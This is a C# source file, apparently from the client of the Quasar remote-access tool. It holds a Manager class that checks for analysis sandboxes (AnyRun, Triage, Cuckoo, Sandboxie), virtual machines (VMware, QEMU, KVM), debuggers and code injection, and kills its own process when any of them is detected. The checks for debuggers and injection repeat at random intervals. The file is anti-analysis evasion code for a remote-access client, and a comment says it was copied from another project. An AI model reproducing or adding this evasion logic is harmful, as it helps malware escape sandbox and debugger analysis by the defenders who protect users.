using Quasar.Client.Anti.Debugger;
using Quasar.Client.Anti.Injection;
using Quasar.Client.Anti.VM;
using Quasar.Client.Config;
using System;
using System.Diagnostics;
using System.Threading.Tasks;

//copy pasted / slightly edited from https://github.com/AdvDebug/AntiCrack-DotNet

namespace Quasar.Client.Anti
{
    public class Manager
    {
        private static void CheckVirtualization()
        {
            Func<bool>[] vmChecks =
            {
                AntiVirtualization.AnyRunCheck,
                AntiVirtualization.TriageCheck,
                AntiVirtualization.CheckForQemu,
                AntiVirtualization.CheckForParallels,
                AntiVirtualization.IsSandboxiePresent,
                AntiVirtualization.IsComodoSandboxPresent,
                AntiVirtualization.IsCuckooSandboxPresent,
                AntiVirtualization.IsQihoo360SandboxPresent,
                AntiVirtualization.CheckForBlacklistedNames,
                AntiVirtualization.CheckForVMwareAndVirtualBox,
                AntiVirtualization.CheckForKVM,
                AntiVirtualization.BadVMFilesDetection,
                AntiVirtualization.BadVMProcessNames,
                AntiVirtualization.CheckDevices,
                AntiVirtualization.Generic.EmulationTimingCheck,
                AntiVirtualization.Generic.PortConnectionAntiVM,
                AntiVirtualization.Generic.AVXInstructions,
                AntiVirtualization.Generic.RDRANDInstruction,
                AntiVirtualization.Generic.FlagsManipulationInstructions
            };

            foreach (var vm in vmChecks)
            {
                if (vm())
                {
                    Debug.WriteLine("Virtualization detected, exiting...");
                    Process.GetCurrentProcess().Kill();
                }
            }
        }

        private static void CheckInjection()
        {
            //AntiInjection.SetDllLoadPolicy();

            while (true)
            {
                Func<bool>[] injectionChecks = new Func<bool>[]
                {
                            AntiInjection.CheckInjectedThreads,
                            AntiInjection.ChangeCLRModuleImageMagic,
                            AntiInjection.CheckForSuspiciousBaseAddress
                };

                foreach (var check in injectionChecks)
                {
                    if (check())
                    {
                        Debug.WriteLine("Injection detected, exiting...");
                        Process.GetCurrentProcess().Kill();
                    }
                }

                int randomSleep = new Random().Next(1000, 5000);
                System.Threading.Thread.Sleep(randomSleep);
            }
        }

        private static void CheckDebugger()
        {
            while (true)
            {
                AntiDebug.HideThreadsAntiDebug();

                Func<bool>[] debugDetections = new Func<bool>[]
                {
                            AntiDebug.NtUserGetForegroundWindowAntiDebug,
                            AntiDebug.DebuggerIsAttached,
                            //AntiDebug.HideThreadsAntiDebug,
                            AntiDebug.IsDebuggerPresentCheck,
                            AntiDebug.BeingDebuggedCheck,
                            AntiDebug.NtGlobalFlagCheck,
                            AntiDebug.NtSetDebugFilterStateAntiDebug,
                            //AntiDebug.PageGuardAntiDebug,
                            AntiDebug.NtQueryInformationProcessCheck_ProcessDebugFlags,
                            AntiDebug.NtQueryInformationProcessCheck_ProcessDebugPort,
                            AntiDebug.NtQueryInformationProcessCheck_ProcessDebugObjectHandle,
                            AntiDebug.NtCloseAntiDebug_InvalidHandle,
                            AntiDebug.NtCloseAntiDebug_ProtectedHandle,
                            AntiDebug.HardwareRegistersBreakpointsDetection,
                            AntiDebug.FindWindowAntiDebug
                };

                foreach (var check in debugDetections)
                {
                    if (check())
                    {
                        Debug.WriteLine("Debugger detected, exiting...");
                        Process.GetCurrentProcess().Kill();
                    }
                }

                int randomSleep = new Random().Next(1000, 5000);
                System.Threading.Thread.Sleep(randomSleep);
            }
        }

        public static void StartAnti()
        {
            if (Settings.ANTIVM)
            {
                Debug.WriteLine("Checking for virtualization...");
                CheckVirtualization();
            }
            if (Settings.ANTIDEBUG)
            {
                Debug.WriteLine("Checking for debugger...");
                //CheckInjection();
                //CheckDebugger();

                Task.Factory.StartNew(() => CheckInjection());
                Task.Factory.StartNew(() => CheckDebugger());

            }
        }
    }
}
